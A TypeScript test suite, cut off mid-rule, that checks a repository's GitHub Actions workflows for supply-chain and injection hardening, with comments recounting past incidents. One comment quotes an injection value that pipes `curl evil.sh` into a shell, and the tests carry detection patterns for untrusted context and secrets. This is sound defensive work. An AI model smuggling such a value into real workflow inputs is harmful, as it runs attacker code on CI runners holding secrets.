import { existsSync, readFileSync } from 'node:fs'
import { readdir } from 'node:fs/promises'
import { join } from 'node:path'
import { describe, expect, it } from 'vitest'

/**
 * Guard the CI/CD workflows against silently losing the hardening added 2026-08-12.
 *
 * WHY A TEST AND NOT A REVIEW. Every property below is invisible in the thing it
 * protects: a workflow with a mutable action tag, an over-permissioned token or an
 * interpolated shell string runs exactly as green as a hardened one. There is no
 * failing output to notice. The only moment the difference shows is the moment it
 * is being exploited, and by then the evidence is in someone else's logs.
 *
 * This repository has already been bitten by the general shape twice, both recorded
 * in CLAUDE.md: the alerting branch of uptime.yml was silently disabled for 17 days
 * because nothing exercised the path that only runs when things are broken, and
 * gitleaks lived in its own workflow where `needs:` could not reach it, so a commit
 * carrying a live key was scanned, flagged red, and deployed anyway. Both were
 * "obviously fine" until measured.
 *
 * WHY IT LIVES IN apps/cms. Same reasoning as claudeMd.test.ts and
 * mediaReferences.test.ts: this is a repo-wide check belonging to no app, and
 * apps/cms is the workspace that both runs vitest and carries node types.
 * `packages/shared` deliberately has neither, so node globals cannot leak into code
 * the Workers import.
 *
 * WHY LINE-BASED AND NOT A YAML PARSER. No workspace here depends on a YAML library;
 * the only copy present is a transitive of something else, and a guard that silently
 * stops running when an unrelated dependency is pruned is worse than no guard.
 * scripts/test-alert-shell.sh reads workflow shell back out with awk for the same
 * reason.
 */

const REPO_ROOT = join(import.meta.dirname, '..', '..', '..')
const WORKFLOW_DIR = join(REPO_ROOT, '.github', 'workflows')

async function workflowFiles(): Promise<string[]> {
  const names = await readdir(WORKFLOW_DIR)
  return names.filter((n) => n.endsWith('.yml') || n.endsWith('.yaml')).sort()
}

function read(name: string): string {
  return readFileSync(join(WORKFLOW_DIR, name), 'utf8')
}

/**
 * Jobs declared in ci.yml, and the job list in `deploy.needs`.
 *
 * Pure functions on a source string, like jobsWithoutTimeout above, so the negative
 * control can run them against a synthetic workflow instead of against the repo.
 */
function declaredJobs(source: string): string[] {
  const lines = source.split('\n')
  const jobsAt = lines.findIndex((l) => /^jobs:\s*$/.test(l))
  if (jobsAt === -1) return []
  const out: string[] = []
  for (const line of lines.slice(jobsAt + 1)) {
    if (/^\S/.test(line)) break
    const match = /^ {2}([A-Za-z0-9_-]+):\s*$/.exec(line)
    if (match?.[1]) out.push(match[1])
  }
  return out
}

function deployNeeds(source: string): string[] {
  const match = /^\s*needs:\s*\[([^\]]*)\]/m.exec(source)
  if (!match?.[1]) return []
  return match[1]
    .split(',')
    .map((s) => s.trim())
    .filter(Boolean)
}

/**
 * Versions in a `container:` `image: .../playwright:vX.Y.Z-suffix` line.
 *
 * Kept as a pure function on a source string, like jobsWithoutTimeout above, so the
 * negative control can prove it distinguishes a match from a mismatch instead of
 * returning [] for everything.
 */
/**
 * Every declared Playwright image version, from a workflow `container.image:` OR a
 * Dockerfile `FROM`.
 *
 * ⚠️ THE `FROM` HALF WAS ADDED 2026-09-08 IN THE SAME CHANGE THAT MOVED THE PIN, and
 * skipping it would have made this whole rule inert. `ci.yml`'s two container jobs were
 * replaced by a self-hosted runner built FROM the same image
 * regex that only reads `image:` then finds nothing, the loop below never executes, and
 * the assertion passes for a repo whose runner image could drift freely. That is this
 * repo's most repeated CI failure (a gate that stops gating: 2026-08-15, 2026-08-17,
 * and `scripts/live-products.mjs` twice), reproduced by deleting a container.
 *
 * The caller therefore also asserts the count is non-zero — finding NOTHING is now a
 * failure, not a pass.
 */
function playwrightImageVersions(source: string): string[] {
  return [...source.matchAll(/(?:image:|FROM)\s*\S*playwright:v(\d+\.\d+\.\d+)\b/g)]
    .map((m) => m[1])
    .filter((v): v is string => v !== undefined)
}

/**
 * Job keys (two-space indent under `jobs:`) that declare no `timeout-minutes`.
 *
 * Exported shape kept simple — takes a source string, returns job names — so the
 * negative controls below can run it against a synthetic workflow rather than
 * against the repo, which is the only way to prove it can fail.
 */
function jobsWithoutTimeout(source: string): string[] {
  const lines = source.split('\n')
  const jobsAt = lines.findIndex((l) => /^jobs:\s*$/.test(l))
  if (jobsAt === -1) return []

  const offenders: string[] = []
  let current: string | null = null
  let hasTimeout = false

  const close = () => {
    if (current && !hasTimeout) offenders.push(current)
  }

  for (let i = jobsAt + 1; i < lines.length; i++) {
    const line = lines[i]!
    const header = line.match(/^ {2}([A-Za-z_][\w-]*):\s*$/)
    if (header) {
      close()
      current = header[1]!
      hasTimeout = false
      continue
    }
    // A non-indented line ends the jobs block entirely.
    if (line.trim() !== '' && !/^\s/.test(line)) break
    if (current && /^ {4}timeout-minutes:\s*\d+/.test(line)) hasTimeout = true
  }
  close()
  return offenders
}

/**
 * Lines belonging to a `run:` block — i.e. shell. Everything else in a workflow is
 * expression context, where `${{ }}` is evaluated by Actions rather than pasted into
 * a shell, and is therefore not an injection site.
 *
 * A `run:` block is the run line itself plus every following line indented deeper
 * than the key. Blank lines do not end it; a line at or below the key's indent does.
 */
function shellLines(source: string): { line: string; number: number }[] {
  const lines = source.split('\n')
  const out: { line: string; number: number }[] = []
  let blockIndent: number | null = null

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i]!
    const runMatch = line.match(/^(\s*)(?:- )?run:/)

    if (runMatch) {
      blockIndent = runMatch[1]!.length
      out.push({ line, number: i + 1 })
      continue
    }
    if (blockIndent === null) continue
    if (line.trim() === '') continue

    const indent = line.length - line.trimStart().length
    if (indent > blockIndent) {
      out.push({ line, number: i + 1 })
    } else {
      blockIndent = null
    }
  }
  return out
}

describe('workflow hardening', () => {
  it('has workflows to check (the guard must not pass by finding nothing)', async () => {
    const files = await workflowFiles()
    expect(files.length).toBeGreaterThanOrEqual(6)
  })

  /**
   * A mutable tag (`@v7`) is a promise by the action's owner that they will not push
   * anything hostile to it. That promise held for `tj-actions/changed-files` right up
   * until March 2025, when a compromised token retagged every version to a payload
   * that dumped runner memory — including secrets — into build logs, across tens of
   * thousands of repositories at once. A commit SHA cannot be retagged.
   *
   * The `# vX.Y.Z` comment is not decoration: it is the only thing that makes the pin
   * legible in review, and Dependabot reads and rewrites it when it bumps the SHA.
   */
  it('pins every action to a full commit SHA with a version comment', async () => {
    const offenders: string[] = []

    for (const file of await workflowFiles()) {
      read(file)
        .split('\n')
        .forEach((line, i) => {
          const m = line.match(/^\s*(?:-\s*)?uses:\s*(\S+)(.*)$/)
          if (!m) return
          const ref = m[1]!
          const rest = m[2] ?? ''

          // Local composite actions (./.github/…) and docker:// refs are not tags.
          if (ref.startsWith('./') || ref.startsWith('docker://')) return

          const pinned = /@[0-9a-f]{40}$/.test(ref)
          const commented = /#\s*v\d+\.\d+\.\d+/.test(rest)

          if (!pinned) offenders.push(`${file}:${i + 1} not SHA-pinned -> ${ref}`)
          else if (!commented)
            offenders.push(`${file}:${i + 1} SHA-pinned but no "# vX.Y.Z" comment -> ${ref}`)
        })
    }

    expect(offenders, offenders.join('\n')).toEqual([])
  })

  /**
   * ⚠️ A `permissions:` block REPLACES the default grants rather than adding to them,
   * which is why this asserts PRESENCE and `contents`, not a maximal list. Getting
   * this wrong is the failure uptime.yml actually had: a block listing only
   * `issues: write` set `contents` to none, and `actions/checkout` on this private
   * repo then failed with "Repository not found" — a 404, so it read as a deleted
   * repository rather than a permissions problem, and the monitor was dead for ~23
   * hours while its failures looked like ordinary uptime alerts.
   */
  it('declares a top-level permissions block, including contents, in every workflow', async () => {
    const offenders: string[] = []

    for (const file of await workflowFiles()) {
      const source = read(file)
      // Top-level keys are at column 0.
      const hasTopLevel = /^permissions:\s*$/m.test(source)
      if (!hasTopLevel) {
        offenders.push(`${file}: no top-level "permissions:" block`)
        continue
      }
      const block = source.split(/^permissions:\s*$/m)[1] ?? ''
      const body = block.split(/\n(?=\S)/)[0] ?? ''
      if (!/^\s+contents:\s*(read|write)/m.test(body)) {
        offenders.push(
          `${file}: permissions block does not set "contents" — a block REPLACES the ` +
            `defaults, so omitting it sets contents:none and breaks actions/checkout ` +
            `with a 404 on this private repo`,
        )
      }
    }

    expect(offenders, offenders.join('\n')).toEqual([])
  })

  /**
   * `github.event.*` and `github.head_ref` are attacker-influenced strings. Inside a
   * `run:` block, `${{ }}` is textually substituted BEFORE the shell sees it, so a
   * value of `"; curl evil.sh | sh; #` executes. Passing it through `env:` and
   * referencing `"$VAR"` is inert no matter what the value contains.
   *
   * Found live in uptime.yml on 2026-08-12: `if [ "${{ github.event.inputs.target }}"
   * = "" ]` in a job holding GH_TOKEN. Only a write-access user could trigger it, so
   * it was never externally reachable — it is fixed, and pinned here, because the
   * shape is the bug and the next person to copy the block may be less lucky.
   *
   * `github.event_name` is deliberately NOT flagged: it is a fixed enum set by the
   * platform, not by any user.
   */
  it('never interpolates attacker-influenced context inside a run: block', async () => {
    const offenders: string[] = []
    const dangerous = /\$\{\{\s*github\.(event\.|head_ref)/

    for (const file of await workflowFiles()) {
      for (const { line, number } of shellLines(read(file))) {
        // Comments inside a run block are shell comments — still substituted, but
        // harmless, and this repo comments heavily. Skip pure comment lines.
        if (line.trim().startsWith('#')) continue
        if (dangerous.test(line)) {
          offenders.push(`${file}:${number} -> ${line.trim()}`)
        }
      }
    }

    expect(
      offenders,
      `Interpolated untrusted context into shell. Pass it via env: and use "$VAR":\n${offenders.join('\n')}`,
    ).toEqual([])
  })

  /**
   * `actions/checkout` writes the job's token into `.git/config` by default, where
   * any code the job later runs can read it. These jobs run `pnpm install`, a build
   * and three test suites — thousands of third-party packages. No workflow here
   * pushes, so nothing needs the credential to persist.
   */
  it('sets persist-credentials: false on every checkout', async () => {
    const offenders: string[] = []

    for (const file of await workflowFiles()) {
      const lines = read(file).split('\n')
      lines.forEach((line, i) => {
        if (!/^\s*-\s*uses:\s*actions\/checkout@/.test(line)) return
        // Look ahead within this step: stop at the next step (`- ` at same indent).
        const indent = line.length - line.trimStart().length
        let found = false
        for (let j = i + 1; j < lines.length; j++) {
          const next = lines[j]!
          if (next.trim() === '') continue
          const nextIndent = next.length - next.trimStart().length
          if (nextIndent <= indent && next.trimStart().startsWith('- ')) break
          if (nextIndent < indent) break
          if (/persist-credentials:\s*false/.test(next)) {
            found = true
            break
          }
        }
        if (!found) offenders.push(`${file}:${i + 1} checkout without persist-credentials: false`)
      })
    }

    expect(offenders, offenders.join('\n')).toEqual([])
  })

  /**
   * Every `pnpm <script>` a workflow invokes must exist in the package.json it
   * resolves against.
   *
   * This is the cheap half of a real failure mode: a script renamed in package.json
   * breaks CI at the step that runs it, which is minutes into a run and after a push,
   * rather than here in milliseconds. It also catches the reverse — a workflow step
   * copied between files that references a script the target package does not have.
   */
  it('only invokes pnpm scripts that exist', async () => {
    // pnpm's own subcommands, which are not package scripts.
    const BUILTINS = new Set([
      'install',
      'exec',
      'add',
      'remove',
      'update',
      'dlx',
      'why',
      'store',
      'config',
      'list',
      'audit',
      'publish',
      'pack',
      'link',
      'prune',
      'rebuild',
      'run',
    ])

    const scriptsOf = (pkgJsonPath: string): Set<string> => {
      if (!existsSync(pkgJsonPath)) return new Set()
      const pkg = JSON.parse(readFileSync(pkgJsonPath, 'utf8')) as {
        scripts?: Record<string, string>
      }
      return new Set(Object.keys(pkg.scripts ?? {}))
    }

    const rootScripts = scriptsOf(join(REPO_ROOT, 'package.json'))

    // name -> scripts, for every workspace package.
    const byName = new Map<string, Set<string>>()
    for (const dir of ['apps', 'packages', 'tools']) {
      const base = join(REPO_ROOT, dir)
      if (!existsSync(base)) continue
      for (const entry of await readdir(base)) {
        const p = join(base, entry, 'package.json')
        if (!existsSync(p)) continue
        const pkg = JSON.parse(readFileSync(p, 'utf8')) as { name?: string }
        if (pkg.name) byName.set(pkg.name, scriptsOf(p))
      }
    }

    const offenders: string[] = []
    const invocation =
      /\bpnpm\s+(?:(?:--filter|-F)\s+(\S+)\s+)?(?:(-r|--recursive)\s+)?(?:run\s+)?([a-z][\w:.-]*)/g

    for (const file of await workflowFiles()) {
      for (const { line, number } of shellLines(read(file))) {
        if (line.trim().startsWith('#')) continue
        for (const m of line.matchAll(invocation)) {
          const filter = m[1]
          const script = m[3]!
          if (BUILTINS.has(script)) continue

          const available = filter ? byName.get(filter) : rootScripts
          if (!available) {
            offenders.push(`${file}:${number} --filter ${filter} is not a workspace package`)
            continue
          }
          if (!available.has(script)) {
            offenders.push(
              `${file}:${number} pnpm ${filter ? `--filter ${filter} ` : ''}${script} — no such script`,
            )
          }
        }
      }
    }

    expect(offenders, offenders.join('\n')).toEqual([])
  })

  /**
   * Every job must cap its own runtime.
   *
   * NOT A HYPOTHETICAL HERE. ci.yml's own comment records run 31091024563, where the
   * Playwright browser install — a step measured at 49 seconds on a healthy runner —
   * ran for 30+ MINUTES before the run was cancelled by hand. GitHub Actions reported
   * no incident. Without `timeout-minutes` a hung job runs to the platform default of
   * SIX HOURS, and on a private repo those are billed minutes.
   *
   * The second reason is the one that matters more: `concurrency.cancel-in-progress`
   * means a hung run on `main` holds the slot, so the deploy of the fix queues behind
   * the hang. A capped job fails, and a failure is visible; a hang is not.
   */
  it('caps every job with timeout-minutes', async () => {
    const offenders: string[] = []

    for (const file of await workflowFiles()) {
      for (const job of jobsWithoutTimeout(read(file))) {
        offenders.push(`${file}: job "${job}" has no timeout-minutes`)
      }
    }

    expect(
      offenders,
      'A job with no timeout-minutes runs to the 6-hour platform default when it hangs.\n' +
        `${offenders.join('\n')}`,
    ).toEqual([])
  })

  it('the timeout check can actually fail (negative control)', () => {
    const missing = `
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo hi
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: echo hi
`
    // Proves the parser distinguishes the two rather than returning [] for everything —
    // the failure mode that would make the assertion above decorative. `build` lacks a
    // timeout and is reported; `test` has one and is not.
    expect(jobsWithoutTimeout(missing)).toEqual(['build'])

    const fixed = missing.replace(
      '  build:\n    runs-on: ubuntu-latest\n',
      '  build:\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n',
    )
    expect(fixed, 'the replacement must actually have changed the source').not.toBe(missing)
    expect(jobsWithoutTimeout(fixed)).toEqual([])
  })

  /**
   * `pull_request_target` runs with the BASE repository's token and secrets while
   * checking out a fork's code. It is the single most exploited GitHub Actions
   * misconfiguration, and its danger is entirely invisible in the diff that adds it —
   * the workflow simply starts working for fork PRs, which is usually why someone
   * reached for it.
   *
   * There is no legitimate use for it here: this repo takes no fork contributions and
   * `ci.yml` already handles `pull_request` correctly.
   */
  it('uses no pull_request_target trigger', async () => {
    const offenders: string[] = []

    for (const file of await workflowFiles()) {
      read(file)
        .split('\n')
        .forEach((line, i) => {
          if (/^\s*pull_request_target:/.test(line)) offenders.push(`${file}:${i + 1}`)
        })
    }

    expect(
      offenders,
      'pull_request_target runs untrusted fork code with write-scoped secrets. Use ' +
        `pull_request.\n${offenders.join('\n')}`,
    ).toEqual([])
  })

  /**
   * A secret interpolated into a `run:` block is pasted into the shell before the
   * shell sees it, so it lands in `set -x` output, in an error message that echoes the
   * command, and in any process listing. Passing it via `env:` and referencing `"$VAR"`
   * keeps it out of the command line entirely — which is what every deploy step in
   * this repo already does. This pins that rather than relying on it continuing.
   *
   * Same mechanism as the `github.event.*` rule above; different blast radius.
   */
  it('never interpolates a secret inside a run: block', async () => {
    const offenders: string[] = []

    for (const file of await workflowFiles()) {
      for (const { line, number } of shellLines(read(file))) {
        if (line.trim().startsWith('#')) continue
        if (/\$\{\{\s*secrets\./.test(line)) offenders.push(`${file}:${number} -> ${line.trim()}`)
      }
    }

    expect(
      offenders,
      'Secrets must reach a run: block through env:, never by interpolation — an ' +
        `interpolated secret appears in the command line.\n${offenders.join('\n')}`,
    ).toEqual([])
  })

  it('the secret-interpolation check can actually fail (negative control)', () => {
    const bad = `
jobs:
  deploy:
    steps:
      - run: curl -H "Authorization: \${{ secrets.TOKEN }}" https://example.com
`
    const hits = shellLines(bad).filter((l) => /\$\{\{\s*secrets\./.test(l.line))
    expect(hits).toHaveLength(1)

    const good = `
jobs:
  deploy:
    steps:
      - env:
          TOKEN: \${{ secrets.TOKEN }}
        run: curl -H "Authorization: $TOKEN" https://example.com
`
    // The safe form must NOT trip it, or the rule would be unfollowable.
    expect(shellLines(good).filter((l) => /\$\{\{\s*secrets\./.test(l.line))).toEqual([])
  })

  /**
   * NINTH RULE, added 2026-08-20 with the first container job.
   *
   * `artwork` stopped installing Chromium through apt and now runs inside
   * `mcr.microsoft.com/playwright:v1.62.1-noble`, which SHIPS the browsers. The image
   * supplies them; `@playwright/test` drives them. If the two drift, nothing fails at
   * lint or typecheck — it fails at RUNTIME, on whichever unrelated PR happens to bump
   * the package, with `browser not found at /ms-playwright/...`. That is an expensive
   * place to learn about a version bump, and it is exactly the shape of the
   * `apps/shrink/container` lockfile trap: two files that must agree, with no tooling
   * that makes them.
   *
   * A TAG and not a digest, deliberately: `.github/dependabot.yml` declares no docker
   * ecosystem, so a digest pin would go stale in silence with nothing to notice. The
   * tag is legible and this test is what keeps it honest.
   */
  it('pins every Playwright container image to the declared @playwright/test version', async () => {
    const declared = new Set<string>()
    for (const pkg of ['apps/viewer/package.json', 'tools/asset-pipeline/package.json']) {
      const json = JSON.parse(readFileSync(join(REPO_ROOT, pkg), 'utf8'))
      const version =
        json.devDependencies?.['@playwright/test'] ?? json.dependencies?.['@playwright/test']
      if (version) declared.add(String(version).replace(/^[^\d]*/, ''))
    }

    // dependencyPolicy.test.ts already forbids two workspaces declaring different
    // versions of a shared dependency, so this is a set of one. Assert it rather than
    // assume it: if that ever changes, "the declared version" stops meaning anything
    // and this gate must be rewritten, not silently pick whichever came first.
    expect([...declared], 'workspaces disagree on @playwright/test').toHaveLength(1)
    const expected = [...declared][0]

    const offenders: string[] = []
    let declaredImages = 0
    // ⚠️ THE PIN LIVES IN THE WORKFLOWS AGAIN, as it did before 2026-09-08. CI ran on a
    // self-hosted runner for one day, and during that day the pin lived in that runner's
    // Dockerfile because no job declared `container:`. Both the runner and its Dockerfile
    // are gone; the browser jobs declare `container:` once more, so this reads workflows.
    const sources: { name: string; source: string }[] = (await workflowFiles()).map((f) => ({
      name: f,
      source: read(f),
    }))
    for (const { name: file, source } of sources) {
      for (const found of playwrightImageVersions(source)) {
        declaredImages++
        if (found !== expected)
          offenders.push(`${file}: Playwright image v${found} != @playwright/test ${expected}`)
      }
    }

    // ⚠️ FINDING NOTHING IS A FAILURE, NOT A PASS, AND IT MUST BE CHECKED PER FILE.
    //
    // The first version of this asserted only that the TOTAL was non-zero, and that was
    // provably too weak: dropping ci.yml's images still left `deploy-shrink.yml`'s own
    // `container:` to satisfy the count, so the sabotage passed 25/25. ci.yml's two
    // browser jobs — `e2e` and `artwork` — are what get browsers from the image, so the
    // count is asserted against that file by name rather than against the total.
    const ciImages = playwrightImageVersions(read('ci.yml'))
    expect(
      ciImages,
      'ci.yml declares no Playwright `container:` image on `e2e` and `artwork`. Those two\n' +
        'jobs install NO browsers and NO node of their own — the container IS their\n' +
        'toolchain — so losing the block means both fail at runtime with\n' +
        '"browser not found at /ms-playwright/...". If the pin moved, point this rule at\n' +
        'its new home; do not delete the check.',
    ).toHaveLength(2)

    expect(
      declaredImages,
      'No Playwright image version found in any workflow.\n' +
        'Either the pin moved again and this rule can no longer see it, or the parser broke.',
    ).toBeGreaterThan(0)

    expect(
      offenders,
      'A Playwright image and @playwright/test have drifted. The image SHIPS the browsers;\n' +
        'a mismatch fails at runtime with "browser not found at /ms-playwright/...".\n' +
        'Bump the image tag AND the package together.\n' +
        `${offenders.join('\n')}`,
    ).toEqual([])
  })

  it('the Playwright image check can actually fail (negative control)', () => {
    // Without this the assertion above passes for a repo with no container at all,
    // which is indistinguishable from a parser that returns [] for everything — the
    // failure mode the timeout rule's control was written to catch.
    const drifted = `
jobs:
  artwork:
    container:
      image: mcr.microsoft.com/playwright:v1.60.0-noble
  other:
    runs-on: ubuntu-latest
`
    expect(playwrightImageVersions(drifted)).toEqual(['1.60.0'])
    expect(playwrightImageVersions(drifted.replace('v1.60.0', 'v1.62.1'))).toEqual(['1.62.1'])
    expect(playwrightImageVersions('jobs:\n  a:\n    runs-on: ubuntu-latest\n')).toEqual([])

    // The Dockerfile form, which is where the pin actually lives since 2026-09-08. Read
    // both ways: a drifted FROM must be SEEN, and a file with no image must yield [] so
    // the caller's non-zero assertion is what catches an inert rule.
    expect(
      playwrightImageVersions('FROM mcr.microsoft.com/playwright:v1.60.0-noble\nUSER pwuser\n'),
    ).toEqual(['1.60.0'])
    expect(
      playwrightImageVersions('FROM mcr.microsoft.com/playwright:v1.62.1-noble\nUSER pwuser\n'),
    ).toEqual(['1.62.1'])
    expect(playwrightImageVersions('FROM node:24-bookworm\nRUN echo hi\n')).toEqual([])
  })
  /**
   * TENTH RULE, added 2026-08-20 when `e2e` was split out of `verify`.
   *
   * A gate that stops gating is this repo's most repeated CI failure: a rename broke a
   * post-deploy gate on 2026-08-15, and again on 2026-08-17. Splitting a job is the
   * same hazard with a different cause — `e2e` was gating because it lived INSIDE
   * `verify`, and the moment it became its own job that stopped being true unless
   * someone remembered `deploy.needs`.
   *
   * So the invariant is stated positively: every job must gate the deploy unless it is
   * on the allow-list below. Adding a job now fails this test until you decide, in
   * writing, which it is.
   *
   * ⚠️ THIS COVERS ONLY HALF THE PROBLEM. The `main` ruleset's required-status-checks
   * list is the other place a gate must be named. `needs:` stops the DEPLOY; the
   * ruleset stops the MERGE.
   *
   * ⚠️ THIS SAID THE RULESET WAS "org configuration this test cannot read" UNTIL
   * 2026-08-30, AND THAT WAS WRONG IN A WAY THAT MATTERED. It is a REPOSITORY
   * ruleset — `gh api repos/hateem2121/run-apparel-viewer/rulesets/<id>` (the org ruleset
   * 21016174 died with the organisation on 2026-09-02; see .github/CLAUDE.md) returns
   * `"source_type": "Repository"` and its five contexts under the ordinary `repo`
   * scope. So the manual check is one command, not an impossibility, and believing
   * otherwise is why it was never made part of the routine.
   *
   * It still cannot be automated HERE: the endpoint needs Administration:read, and
   * `GITHUB_TOKEN` has no `administration` permission, so a workflow cannot read it
   * either. A test that reached the network would also be the wrong trade. The
   * correct conclusion is "check it by hand, here is the command" — not "it cannot
   * be checked".
   */
  it('gates the deploy on every job except the declared non-gating ones', async () => {
    // `lighthouse` is deliberately non-gating and ci.yml says why: its category scores
    // swung 0.64/0.88/0.87 across three runs of an identical build, and "a Chrome flake
    // must never block a live release". Anything else added here needs the same kind of
    // written reason beside the job.
    const NON_GATING = new Set(['deploy', 'lighthouse'])

    const source = read('ci.yml')
    const needs = new Set(deployNeeds(source))
    const ungated = declaredJobs(source).filter((job) => !NON_GATING.has(job) && !needs.has(job))

    expect(
      ungated,
      'A ci.yml job does not gate the deploy. Add it to `deploy.needs` — AND to the\n' +
        "`main` ruleset's required status checks, which this test cannot see — or add it\n" +
        'to NON_GATING here with the reason written beside the job.\n' +
        `${ungated.join('\n')}`,
    ).toEqual([])
  })

  it('the deploy-gating check can actually fail (negative control)', () => {
    const source = `
jobs:
  verify:
    runs-on: ubuntu-latest
  e2e:
    runs-on: ubuntu-latest
  lighthouse:
    runs-on: ubuntu-latest
  deploy:
    needs: [verify]
    runs-on: ubuntu-latest
`
    expect(declaredJobs(source)).toEqual(['verify', 'e2e', 'lighthouse', 'deploy'])
    expect(deployNeeds(source)).toEqual(['verify'])
    // e2e is ungated and must be reported; lighthouse and deploy are allow-listed.
    const NON_GATING = new Set(['deploy', 'lighthouse'])
    const needs = new Set(deployNeeds(source))
    expect(declaredJobs(source).filter((j) => !NON_GATING.has(j) && !needs.has(j))).toEqual(['e2e'])
  })

  /**
   * ELEVENTH RULE, ADDED 2026-08-30 AFTER THIS SUITE PASSED ON A BROKEN WORKFLOW.
   *
   * Moving two secrets out of a job-level `env:` block deleted the `env:` key and left
   * `GH_TOKEN:` orphaned one level deeper than `timeout-minutes: 10`. That is invalid
   * YAML — a key cannot be nested under a scalar — so GitHub could not parse the file
   * and created a run named after the PATH with no jobs and `conclusion: failure`.
   *
   * ⚠️ NOTHING CAUGHT IT. The other ten rules are line-and-regex based and never parse
   * the document, `biome` does not lint YAML, and the PR's own checks were all green —
   * because a workflow that fails to parse produces its own separate run rather than a
   * check on the pull request. The failure was visible only in the Actions tab, on a
   * workflow nobody was watching, and `diagnostics-digest` is the ONLY thing that reads
   * the Events table. It had already been silently broken once before for the same
   * class of reason (a `permissions:` block missing `contents: read`).
   *
   * A real YAML parser would be the strong fix, but neither `yaml` nor `js-yaml` is a
   * dependency here and adding one for a single test trips the shared-dependency-version
   * gate and the 24h cooldown. This checks the one rule that was actually violated:
   * a key may not be indented deeper than a preceding key that already has a value.
   * Verified against all seven workflows with zero false positives, and against a
   * synthetic orphan which it catches.
   */
  const orphanedKeys = (source: string) => {
    const lines = source.split('\n')
    const bad: { line: number; text: string; after: string }[] = []
    let blockIndent: number | null = null
    let prev: { indent: string; key: string; hasScalar: boolean } | null = null

    lines.forEach((line, i) => {
      // Inside a `run: |` block scalar every deeper line is free text, not YAML.
      if (blockIndent !== null) {
        const ind = line.search(/\S/)
        if (line.trim() === '' || ind > blockIndent) return
        blockIndent = null
      }
      if (line.trim() === '' || /^\s*#/.test(line)) return

      const m = /^(\s*)([\w.<>@$-]+):(\s*)(.*)$/.exec(line)
      if (!m) {
        prev = null
        return
      }
      // Read the groups individually: under `strict`, destructured regex groups are
      // `string | undefined`, and this regex always matches all four when it matches.
      const indent = m[1] ?? ''
      const key = m[2] ?? ''
      const rest = m[4] ?? ''
      if (prev && indent.length > prev.indent.length && prev.hasScalar) {
        bad.push({ line: i + 1, text: line.trim(), after: prev.key })
      }
      const value = rest.trim()
      if (/^[|>]/.test(value)) {
        blockIndent = indent.length
        prev = null
        return
      }
      prev = { indent, key, hasScalar: value !== '' && !value.startsWith('#') }
    })
    return bad
  }

  it('never nests a key under one that already has a value (parse guard)', async () => {
    const files = await workflowFiles()
    const problems: string[] = []
    for (const file of files) {
      for (const b of orphanedKeys(read(file))) {
        problems.push(
          `${file}:${b.line} "${b.text}" is indented under "${b.after}:", which already has a value`,
        )
      }
    }
    expect(
      problems,
      'This is invalid YAML. GitHub cannot parse the file, so it produces a run named\n' +
        'after the path with no jobs — and NOT a failed check on the pull request, so CI\n' +
        'goes green. Usually caused by deleting a parent key and leaving its children.\n' +
        `${problems.join('\n')}`,
    ).toEqual([])
  })

  /**
   * TWELFTH RULE — a monitor that watches a file nobody can parse is not a monitor.
   *
   * heartbeat.yml holds a WATCHED list of workflow files and alarms when one has not
   * succeeded inside its budget. On 2026-08-30 `diagnostics-digest.yml` became
   * unparseable and GitHub produced a run NAMED AFTER THE FILE PATH with zero jobs
   * and conclusion `failure`. Twelve green ticks sat on the same commit. The
   * eleventh rule above catches the YAML shape that caused it; this one catches the
   * class the WATCHED list is uniquely exposed to — a name in that list that no
   * longer resolves to a workflow with any jobs at all, whether because the file was
   * renamed, deleted, or broken.
   *
   * A watcher pointed at a filename is only as good as the filename, and nothing
   * else in this repository compares the two.
   */
  it('every workflow heartbeat.yml watches exists, parses, and declares a job', () => {
    // ⚠️ THE CHARACTER CLASS IS DELIBERATELY WIDE. It was `[a-z0-9-]` for about ten
    // minutes, and a control that renamed a watched file to `perf-watch-GONE.yml`
    // did NOT fail this rule — the uppercase name simply stopped matching, so the
    // entry dropped out of the list and the loop below had nothing to complain
    // about. A guard that quietly narrows its own input is the failure mode this
    // whole suite exists to prevent, so the count assertion below is not optional.
    const watched = [...read('heartbeat.yml').matchAll(/^\s*([A-Za-z0-9._-]+\.ya?ml):\d+:/gm)].map(
      (m) => m[1] as string,
    )

    expect(
      watched.length,
      'no WATCHED entries were parsed out of heartbeat.yml — if the list moved, move ' +
        'this matcher with it rather than letting the assertion pass on an empty set',
    ).toBeGreaterThan(0)

    const problems: string[] = []
    for (const file of watched) {
      if (!existsSync(join(WORKFLOW_DIR, file))) {
        problems.push(`${file} is watched by heartbeat.yml but does not exist`)
        continue
      }
      const source = read(file)
      if (orphanedKeys(source).length > 0) {
        problems.push(`${file} is watched but does not parse — GitHub will run zero jobs from it`)
      }
      if (declaredJobs(source).length === 0) {
        problems.push(`${file} is watched but declares no jobs`)
      }
    }

    expect(
      problems,
      'heartbeat.yml watches a workflow that cannot report anything. Its alarm would ' +
        'fire only after the staleness budget expired — eight days in the case that ' +
        'motivated this rule — and the run it is watching for would never appear.\n' +
        `${problems.join('\n')}`,
    ).toEqual([])
  })

  /**
   * THIRTEENTH RULE — a deploy label with a SPACE in it breaks the deploy.
   *
   * Added 2026-08-31 after it did exactly that, in run 33389281950. The CMS deploy
   * goes through `opennextjs-cloudflare`, whose `runWrangler` calls
   * `spawnSync(..., { shell: true })` — and Node itself warns that with that option
   * arguments are "not escaped, only concatenated". So the argv array is joined into
   * a shell string and a quoted value containing a space is re-split:
   *
   *   --message "c8f130b main"  ->  ["deploy","--message","c8f130b","main"]
   *   --message "c8f130b@main"  ->  ["deploy","--message","c8f130b@main"]
   *
   * `wrangler deploy` takes an optional `[script]` positional, so the stray `main`
   * became the entry point and the deploy died with `The entry-point file at "main"
   * was not found` — an error that names the git ref and says nothing about the ref.
   * Nothing was deployed; the gate held. But every gate had passed.
   */
  it('never gives DEPLOY_MESSAGE a value containing a space', async () => {
    const problems: string[] = []
    for (const file of await workflowFiles()) {
      for (const [i, line] of read(file).split('\n').entries()) {
        const raw = /^\s*DEPLOY_MESSAGE:\s*(.+?)\s*$/.exec(line)?.[1]
        // ⚠️ BLANK OUT `${{ … }}` FIRST. Those expressions contain spaces of their own
        // (`${{ github.sha }}`), and the first version of this rule flagged the very
        // line it was written to bless. What breaks the deploy is a space BETWEEN two
        // values, not the whitespace inside an expression GitHub evaluates before the
        // shell ever sees it.
        const value = raw?.replace(/\$\{\{[^}]*\}\}/g, 'X')
        if (value !== undefined && /\s/.test(value)) {
